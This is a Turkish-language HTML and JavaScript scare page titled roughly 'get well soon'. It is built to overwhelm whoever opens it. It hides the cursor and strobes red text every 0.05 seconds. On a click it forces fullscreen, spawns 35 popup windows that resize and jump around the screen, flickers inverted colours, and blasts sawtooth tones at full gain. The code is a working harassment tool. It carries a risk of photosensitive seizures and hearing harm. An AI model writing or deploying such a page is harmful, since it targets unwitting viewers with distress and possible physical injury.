<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>G E Ç . M İ Ş . O L S U N</title>
    <style>
        * { cursor: none !important; margin: 0; padding: 0; }
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            height: 100vh;
        }

        /* Bozucu arka plan videosu */
        #noise {
            position: fixed;
            width: 100%; height: 100%;
            opacity: 0.3;
            z-index: -1;
            filter: invert(1) contrast(500%);
        }

        #warning {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            font-size: 8vw;
            text-align: center;
            animation: flash 0.05s infinite;
        }

        @keyframes flash {
            0% { opacity: 1; color: #ff0000; transform: translate(-50%, -50%) scale(1); }
            50% { opacity: 0; color: #fff; transform: translate(-51%, -49%) scale(1.1); }
            100% { opacity: 1; color: #ff0000; transform: translate(-50%, -50%) scale(1); }
        }

        .blood {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(150,0,0,0.5), transparent);
            pointer-events: none;
            z-index: 1000;
        }
    </style>
</head>
<body onclick="launchNightmare()">

<div class="blood"></div>
<video id="noise" autoplay loop muted>
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
</video>
<div id="warning">T I K L A</div>

<script>
    let audioCtx;
    const sites = [
        "https://www.google.com/search?q=0101010101",
        "https://www.google.com/search?q=RUN+AWAY",
        "https://www.google.com/search?q=HELP+ME",
        "about:blank"
    ];

    function launchNightmare() {
        // 1. Tam Ekran ve Ses Hazırlığı
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
        document.getElementById('warning').innerHTML = "S E N İ N L E Y İ Z";
        
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        maxVolumeScream();

        // 2. 30'dan Fazla Sekme ve Pencere Saldırısı
        for (let i = 0; i < 35; i++) {
            setTimeout(() => {
                let win = spawnWindow();
                if (win) manipulateWindow(win);
            }, i * 150);
        }

        // 3. Ekran ve Renk Bozulmaları
        setInterval(() => {
            document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) invert(1)`;
        }, 100);
    }

    function spawnWindow() {
        const w = 200, h = 200;
        const x = Math.random() * window.screen.width;
        const y = Math.random() * window.screen.height;
        const target = sites[Math.floor(Math.random() * sites.length)];
        
        const win = window.open(target, "_blank", `width=${w},height=${h},left=${x},top=${y},menubar=no,status=no`);
        
        if (win) {
            win.document.write("<body style='background:red; color:white; overflow:hidden;'><h1>GİDEMEZSİN</h1></body>");
        }
        return win;
    }

    // Pencereleri Büyütüp Küçülten ve Zıplatan Fonksiyon
    function manipulateWindow(w) {
        let grow = true;
        let size = 200;
        setInterval(() => {
            if (!w || w.closed) return;
            
            // Boyut değiştirme
            size = grow ? size + 20 : size - 20;
            if (size > 500 || size < 100) grow = !grow;
            w.resizeTo(size, size);
            
            // Rastgele konuma fırlatma
            w.moveTo(Math.random() * window.screen.width, Math.random() * window.screen.height);
        }, 100);
    }

    // Maksimum Desibel Kulak Tırmalayıcı Ses (White Noise + Sawtooth)
    function maxVolumeScream() {
        const duration = 2; // Saniye bazlı döngü
        setInterval(() => {
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();

            osc.type = 'sawtooth'; // En keskin ve rahatsız edici dalga tipi
            osc.frequency.setValueAtTime(200 + Math.random() * 2000, audioCtx.currentTime);
            
            // %100 Desibel (Gain = 1.0 tam kapasitedir)
            gain.gain.setValueAtTime(1.0, audioCtx.currentTime); 
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);

            osc.connect(gain);
            gain.connect(audioCtx.destination);

            osc.start();
            osc.stop(audioCtx.currentTime + 0.5);
        }, 200);
    }
</script>
</body>
</html>
